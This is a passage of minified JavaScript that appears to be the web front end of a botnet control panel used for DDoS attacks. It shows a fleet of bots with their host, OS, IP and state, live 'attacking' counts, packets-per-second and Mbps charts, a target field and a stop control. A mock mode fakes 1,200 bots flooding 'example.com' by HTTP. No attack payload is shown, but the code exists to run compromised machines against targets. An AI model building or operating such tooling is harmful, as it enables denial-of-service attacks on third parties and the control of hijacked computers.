      function applyState(payload){state.online=Number(payload.online||0);state.total=Number(payload.total||0);state.attacking=Number(payload.attacking||0);state.pps=Number(payload.pps||0);state.mbps=Number(payload.mbps||0);state.uptime=Number(payload.uptime||0);state.truncated=Number(payload.truncated||0);state.job=(payload.job && payload.job !== null) ? payload.job : null;state.bots = Array.isArray(payload.bots) ? payload.bots : [];state.serverNow = Number(payload.now || 0);serverClockOffset = state.serverNow * 1000 - Date.now();const seen= new Set((state.bots||[]).map(b=>b.id));for(const id of [...seen].filter(x=>!lastSeenIds.has(x))) addEvent('info','agent online '+id);for(const id of [...lastSeenIds].filter(x=>!seen.has(x))) addEvent('warn','agent offline '+id);lastSeenIds=seen;renderTopBar();renderJobBanner();renderStateChips();renderFleet();renderCharts();}
      function safeJson(v){try{return JSON.parse(v);}catch(e){return null;}}
      function fetchState(){if(inFlight) return;inFlight=true;setConnection('amber');const seq = ++requestSeq;fetch(buildApiUrl('/api/state')).then(async res=>{if(!res.ok){const body=await res.text();const payload=safeJson(body);if(res.status===401 || (payload&&payload.e==='auth')){showBadToken();throw new Error('401');}toast('error','HTTP '+res.status);throw new Error(String(res.status));}return res.json();}).then(data=>{if(seq !== requestSeq) return;hideBadToken();mockMode=false;ui.mockBadge.classList.add('hidden');applyState(data);setConnection('green');setNextRefresh(REFRESH_MS);}).catch(err=>{if(seq !== requestSeq) return;if(window.location.protocol === 'file:' && !mockMode){mockMode = true;ui.mockBadge.classList.remove('hidden');applyMockState();setConnection('green');setNextRefresh(REFRESH_MS);return;}setConnection('red');toast('error', 'HTTP ' + (err && err.message ? err.message : 'error'));setNextRefresh(BACKOFF_MS);}).finally(()=>{inFlight=false;});}
      function applyMockState(){const base = {online:412,total:900,attacking:412,pps:1284000,mbps:940.2,uptime:84211,now:1730000123.5,truncated:0,job:null,history:[],bots:[]};const bots = Array.from({length:1200},(_,i)=>({id:'bot-'+String(i+1).padStart(5,'0'),host:i%3===0?'NODE-'+(i%10):i%5===0?'HOST-'+(i%7):'DESKTOP-'+(i%13),os:i%2?'Windows 11':'Linux',arch:i%3===0?'AMD64':'ARM64',ip:(i%250)+'.'+(i%127)+'.'+(i%63)+'.'+(i%17),state:i%12===0?'idle':i%9===0?'dead':'attack',pps:(i%8+1)*4200+Math.round(Math.random()*8000),mbps:(i%5+1)*1.7 + (i%3)*0.6,cpu:Number((Math.random()*0.35).toFixed(2)),perm:i%11===0?1:0,up:90000 + i%4000,ver:'1.'+(i%4),age:i%40, target:'example.com', method:'http'}));base.bots = bots; base.online = bots.filter(b=>b.state === 'attack').length + 90; base.attacking = bots.filter(b=>b.state === 'attack').length; base.pps = bots.reduce((sum,b)=>sum+b.pps,0) / 6; base.mbps = Number((bots.reduce((sum,b)=>sum+b.mbps,0)/6).toFixed(1)); base.total = bots.length; base.uptime = 84211; base.now = Math.floor(Date.now()/1000) - 50; state.serverNow = base.now; state.online = base.online; state.total = base.total; state.attacking = base.attacking; state.pps = base.pps; state.mbps = base.mbps; state.uptime = base.uptime; state.job = null; state.bots = base.bots; state.truncated = 0; setConnection('green');renderTopBar();renderJobBanner();renderStateChips();renderFleet();renderCharts();loadCommandHistory();addEvent('info','mock mode');}
      function renderCharts(){const ppsVals = [];const mbpsVals = [];for(let i=0;i<60;i++){ppsVals.push(state.pps || 0);mbpsVals.push(state.mbps || 0);} if(typeof Chart !== 'undefined'){if(!chartReady){chartReady=true;chartInstances.pps = new Chart(document.getElementById('ppsCanvas'),{type:'line',data:{labels:Array.from({length:60},(_,i)=>i),datasets:[{data:Array(60).fill(0),borderColor:'#1f6feb',backgroundColor:'rgba(31,111,235,.1)',borderWidth:1.5,pointRadius:0,tension:.25,fill:false}]},options:{responsive:true,maintainAspectRatio:false,animation:false,plugins:{legend:{display:false},tooltip:{enabled:false}},scales:{x:{display:false},y:{display:false}}}});chartInstances.mbps = new Chart(document.getElementById('mbpsCanvas'),{type:'line',data:{labels:Array.from({length:60},(_,i)=>i),datasets:[{data:Array(60).fill(0),borderColor:'#2ea043',backgroundColor:'rgba(46,160,67,.1)',borderWidth:1.5,pointRadius:0,tension:.25,fill:false}]},options:{responsive:true,maintainAspectRatio:false,animation:false,plugins:{legend:{display:false},tooltip:{enabled:false}},scales:{x:{display:false},y:{display:false}}}});}} else if(!chartReady){console.warn('Chart.js failed to load; using canvas fallback');chartReady = 'fallback';} if(typeof Chart !== 'undefined'){const ppsData = chartInstances.pps.data.datasets[0].data;const mbpsData = chartInstances.mbps.data.datasets[0].data;ppsData.push(Number(state.pps || 0));if(ppsData.length>60) ppsData.shift();mbpsData.push(Number(state.mbps || 0));if(mbpsData.length>60) mbpsData.shift();chartInstances.pps.update();chartInstances.mbps.update();return;}const p = document.getElementById('ppsCanvas');const m = document.getElementById('mbpsCanvas');drawSpark(p, ppsVals, '#1f6feb');drawSpark(m, mbpsVals, '#2ea043');}
      function drawSpark(canvas, vals, color){const ctx=canvas.getContext('2d');const w=canvas.clientWidth || 300;const h=canvas.clientHeight || 150;const dpr=window.devicePixelRatio || 1;canvas.width = w*dpr; canvas.height = h*dpr; ctx.setTransform(1,0,0,1,0,0); ctx.scale(dpr,dpr); ctx.clearRect(0,0,w,h); const arr=Array.isArray(vals)?vals:[0]; const max=Math.max(...arr,1); const min=Math.min(...arr,0); const range = Math.max(1, max - min); ctx.strokeStyle=color; ctx.lineWidth=1.5; ctx.beginPath(); arr.forEach((v,i)=>{const x=(i/(arr.length-1))*w;const y=h - ((Number(v)-min)/range)*(h-8) - 4; if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);}); ctx.stroke(); ctx.strokeStyle='rgba(255,255,255,.08)'; ctx.beginPath(); for(let i=0;i<8;i++){const x = (i/7)*w; const y = (h*0.5) + Math.sin(i*2)*6; ctx.moveTo(x,y); ctx.lineTo(x+5,y+3);} ctx.stroke();}
      function setupSortHeaders(){document.querySelectorAll('.sortable').forEach(th=>th.addEventListener('click',()=>{const key=th.getAttribute('data-key');if(!key) return;if(sortKey===key) sortDir *= -1; else {sortKey=key;sortDir=1;} renderFleet();}));}
      function bindKeys(){document.addEventListener('keydown',(ev)=>{const active = document.activeElement && document.activeElement.tagName; const isText = active === 'INPUT' || active === 'TEXTAREA' || active === 'SELECT'; if(ev.code==='Space' && !isText){ev.preventDefault();handleStop();} if((ev.key||'').toLowerCase()==='f' && !isText){ev.preventDefault();ui.targetInput.focus();} if(ev.key==='Escape'){ui.fleetFilter.value='';textFilter='';activeStateFilter='all';renderFleet();renderStateChips();}});document.addEventListener('visibilitychange',()=>{if(!document.hidden){fetchState();}});}
      function initCharts(){const script=document.createElement('script');script.src='https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js';script.async=true;script.onload=()=>{if(typeof Chart !== 'undefined'){renderCharts();}};script.onerror=()=>{console.warn('Chart.js failed to load; using canvas fallback');renderCharts();};document.head.appendChild(script);}
      function init(){restoreForm();bindForm();setupSortHeaders();bindKeys();loadCommandHistory();ui.fleetFilter.addEventListener('input',e=>{textFilter = (e.target.value||'').trim(); renderFleet();});document.addEventListener('keydown',(ev)=>{if(ev.key==='Escape'){ui.fleetFilter.value='';textFilter='';activeStateFilter='all';renderFleet();renderStateChips();}});addEvent('info','session ready');renderTopBar();renderJobBanner();renderStateChips();renderFleet();setConnection('amber');setNextRefresh(REFRESH_MS);if(window.location.protocol === 'file:'){mockMode=true;ui.mockBadge.classList.remove('hidden');applyMockState();} else {fetchState();} initCharts();}
      init();
    })();
